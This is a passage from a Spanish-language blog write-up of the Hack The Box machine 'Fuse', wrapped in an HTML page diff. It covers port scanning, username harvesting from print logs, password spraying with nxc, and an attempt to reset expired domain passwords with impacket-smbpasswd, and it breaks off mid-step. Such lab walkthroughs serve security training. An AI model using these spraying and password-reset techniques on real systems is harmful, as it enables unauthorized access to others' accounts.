@@ -1,0 +1,479 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-fuse">Hack The Box: Fuse</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Fuse&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h2 id="-initial-enumeration">🕵️‍♂️ Initial Enumeration</h2>
+<h1 id="nmap">Nmap</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.2.5 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.2.5 -&gt; <span style="color:#f92672">[</span>139,135,88,80,53,464,445,389,636,593,3268,3269,5985,9389,49667,49666,49677,49678,49679,49707<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p139,135,88,80,53,464,445,389,636,593,3268,3269,5985,9389,49667,49666,49677,49678,49679,49707 -sCV 10.129.2.5 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-29 22:56 CEST
+</span></span><span style="display:flex;"><span>Stats: 0:01:35 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
+</span></span><span style="display:flex;"><span>NSE Timing: About 96.88% <span style="color:#66d9ef">done</span>; ETC: 22:58 <span style="color:#f92672">(</span>0:00:00 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.2.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.041s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain       Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-07-29 19:10:14Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: FABRICORP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf       .NET Message Framing
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49678/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49679/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49707/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: required
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: Fuse
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: FUSE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: fabricorp.local
+</span></span><span style="display:flex;"><span>|   Forest name: fabricorp.local
+</span></span><span style="display:flex;"><span>|   FQDN: Fuse.fabricorp.local
+</span></span><span style="display:flex;"><span>|_  System time: 2024-07-29T12:11:07-07:00
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-07-29T19:11:04
+</span></span><span style="display:flex;"><span>|_  start_date: 2024-07-29T19:07:02
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 33m18s, deviation: 4h02m32s, median: -1h46m43s
+</span></span></code></pre></div><h1 id="udp">UDP</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.2.5 -oN ../scan/allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-29 23:22 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.2.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1497</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>53/udp  open  domain
+</span></span><span style="display:flex;"><span>88/udp  open  kerberos-sec
+</span></span><span style="display:flex;"><span>123/udp open  ntp
+</span></span></code></pre></div><h1 id="-web-enumeration">🌐 Web Enumeration</h1>
+<p>Por ahora hemos descubierto el dominio <code>fabricorp.local</code> y un subdominio <code>fuse.fabricorp.local</code></p>
+<p>Tiene un servicio web así que vamos a echarle un vistazo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://fabricorp.local
+</span></span><span style="display:flex;"><span>http://fabricorp.local <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.2.5<span style="color:#f92672">]</span>, Meta-Refresh-Redirect<span style="color:#f92672">[</span>http://fuse.fabricorp.local/papercut/logs/html/index.htm<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>http://fuse.fabricorp.local/papercut/logs/html/index.htm <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Frame, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.2.5<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>PaperCut Print Logger : Print Logs<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Parece que tiene algo que ver con un servicio de impresión.
+Vemos tres archivos.</p>
+<ul>
+<li>papercut-print-log-xxxx-xx-xx.csv</li>
+</ul>
+<p>De los cuales conseguimos usuarios.</p>
+<ul>
+<li>pmerton</li>
+<li>tlavel</li>
+<li>sthompson</li>
+<li>bhult</li>
+</ul>
+<p>También un nombre de impresora <code>HP-MFT01</code></p>
+<p>Y también nombres de ficheros interesantes</p>
+<ul>
+<li>backup_tapes</li>
+<li>Fabricorp01.docx</li>
+</ul>
+<p>Con <code>kerbrute</code> podemos validar estos usuarios</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>2024/07/29 23:11:13 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 tlavel@fabricorp.local
+</span></span><span style="display:flex;"><span>2024/07/29 23:11:13 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 bhult@fabricorp.local
+</span></span><span style="display:flex;"><span>2024/07/29 23:11:13 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 pmerton@fabricorp.local
+</span></span><span style="display:flex;"><span>2024/07/29 23:11:13 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 sthompson@fabricorp.local
+</span></span></code></pre></div><p>Después de enumerar mas, no encuentro nada, por lo cual voy a utilizar de contraseña los nombres de los documentos que se han imprimido</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat passwords.txt 
+</span></span><span style="display:flex;"><span>mega_mountain_tape_request
+</span></span><span style="display:flex;"><span>mega_mountain
+</span></span><span style="display:flex;"><span>mega_mountain_tape
+</span></span><span style="display:flex;"><span>Fabricorp01
+</span></span><span style="display:flex;"><span>fabricorp01
+</span></span><span style="display:flex;"><span>backup_tapes
+</span></span><span style="display:flex;"><span>offsite_dr_invocation
+</span></span><span style="display:flex;"><span>dr_invocation
+</span></span><span style="display:flex;"><span>printing_issue_test
+</span></span></code></pre></div><h1 id="password-spraying">Password Spraying</h1>
+<p>Con <code>nxc</code> vamos a hacer password spraying, a ver si conseguimos alguna cuenta.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.2.5 -u users.txt -p passwords.txt --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:FUSE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fabricorp.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:mega_mountain_tape_request STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:mega_mountain_tape_request STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:mega_mountain_tape_request STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:mega_mountain_tape_request STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:mega_mountain_tape_request STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:mega_mountain STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:mega_mountain STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:mega_mountain STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:mega_mountain STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:mega_mountain STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:mega_mountain_tape STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:mega_mountain_tape STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:mega_mountain_tape STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:mega_mountain_tape STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:mega_mountain_tape STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:Fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:Fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:fabricorp01 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:backup_tapes STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:backup_tapes STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:backup_tapes STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:backup_tapes STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:backup_tapes STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:offsite_dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:offsite_dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:offsite_dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:offsite_dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:offsite_dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:dr_invocation STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\p</span>merton:printing_issue_test STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:printing_issue_test STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\t</span>lavel:printing_issue_test STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>thompson:printing_issue_test STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>hult:printing_issue_test STATUS_LOGON_FAILURE
+</span></span></code></pre></div><h1 id="changing-users-passwords-with-impacket-smbpasswd">Changing Users Passwords with impacket-smbpasswd</h1>
+<p>Y encontramos varios usuarios válidos que deben cambiar sus contraseñas.</p>
+<ul>
+<li>bnielson:Fabricorp01</li>
+<li>tlavel:Fabricorp01</li>
+<li>bhult:Fabricorp01</li>
+</ul>
+<p>Todos estos usuarios, al intentar autenticarnos como ellos, se nos devuelve el error <code>NT_STATUS_PASSWORD_MUST_CHANGE</code></p>
+<p>Pero esto no es problema, porque con herramientas como <code>smbpasswd</code> podemos cambiar la contraseña del usuario, aunque sería muy ruidoso, pero estamos en un CTF&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-smbpasswd bnielson@10.129.2.5 -newpass pointed123
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================================</span>
+</span></span><span style="display:flex;"><span>  Warning: This functionality will be deprecated in the next Impacket version  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Current SMB password: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Password is expired, trying to bind with a null session.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Some password update rule has been violated. For example, the password may not meet length criteria.
